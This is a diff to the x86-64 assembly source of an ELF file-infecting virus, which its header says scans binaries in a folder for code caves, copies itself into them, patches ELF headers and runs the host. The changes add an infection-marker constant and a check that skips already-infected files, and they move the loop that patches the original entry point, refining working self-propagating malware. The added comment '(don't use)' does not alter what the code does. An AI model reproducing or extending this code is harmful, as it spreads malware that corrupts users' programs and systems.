@@ -7,7 +7,7 @@ BITS 64
 ; scans all binaries in folder for codecaves and copies itself into the cave
 ; modifies the elf header to allow normal execution
 ; executes the binary, causing chaos in the wrong enviroment  
-; USE WITH CAUTION
+; USE WITH EXTREME CAUTION (don't use)
 ;
 ; ====================================================================
 
@@ -68,6 +68,7 @@ PF_X         equ 0x1
 SH_SIZEOFF   equ 0x20
 SH_OFFSETOFF equ 0x18
 
+ID          equ 0x1313131313131313
 PLACEHOLDER equ 0xAAAAAAAAAAAAAAAA
 ALLOC_SPACE equ 0x20
 ;--------- CONSTANTS ---------; 
@@ -102,7 +103,7 @@ intmain:
 
     ;; int r9 = open(".", O_DIRECTORY)
     ;; if (r9 < 0) return 1
-    mov rax, 0x1313131313131313  ; ID
+    mov rax, ID
     xor rax, rax
     push '.'
     mov rdi, rsp
@@ -156,6 +157,7 @@ dirloop:
 
 
 ;; parasite(char *rdi)
+parasite:
 ; ----- VARS ------
 elf_map         equ STATSIZ
 phdr_entry      equ STATSIZ-8
@@ -165,7 +167,6 @@ para_offset     equ STATSIZ-8*4
 para_load_addr  equ STATSIZ-8*5
 old_entry       equ STATSIZ-8*6
 ; ----- VARS ------
-parasite:
         push rsi
         push rdx
         push rcx
@@ -290,6 +291,41 @@ not_our_section:
 ;;          }
 find_pading_end:
 
+        mov rbx, rax
+        mov r8, rbx
+        add r8, para_size
+
+        mov r9, PLACEHOLDER
+        mov r10, ID
+            
+        ;; while (rbx < elf_map + para_size) {
+replace_placeholder:
+        cmp rbx, r8
+        jge replace_placeholder_end
+
+            ;; if (*rbx == ID) {
+            ;;    return 
+            cmp r10, [rbx]
+            je para_ret
+
+            ;; if (*rbx == PLACEHOLDER)  {
+                ;; *rbx = old_entry
+                ;; break
+            ;;}
+            
+            cmp r9, [rbx]
+            je rpls
+
+        ;; rbx++
+        inc rbx
+        jmp replace_placeholder
+
+rpls:
+        mov r15, [rbp+old_entry]
+        mov [rbx], r15
+replace_placeholder_end:
+
+
         ;; if (padsiz < parasz) return 1
         cmp dword [rbp+padsiz], para_size
         jl para_ret 
@@ -349,33 +385,6 @@ mod_sht_end:
         xor rax, rax
         mov al, SYS_MUNMAP
         syscall
-
-        mov rbx, rax
-        mov r8, rbx
-        add r8, para_size
-
-        mov r9, PLACEHOLDER
-            
-        ;; while (rbx < elf_map + para_size) {
-replace_placeholder:
-        cmp rbx, r8
-        jge replace_placeholder_end
-
-            ;; if (*rbx == PLACEHOLDER)  {
-                ;; *rbx = old_entry
-                ;; break
-            ;;}
-            cmp r9, [rbx]
-            je rpls
-
-        ;; rbx++
-        inc rbx
-        jmp replace_placeholder
-
-rpls:
-        mov r15, [rbp+old_entry]
-        mov [rbx], r15
-replace_placeholder_end:
 
         ;; munmap(elf_map, r14)
         mov rdi, rax
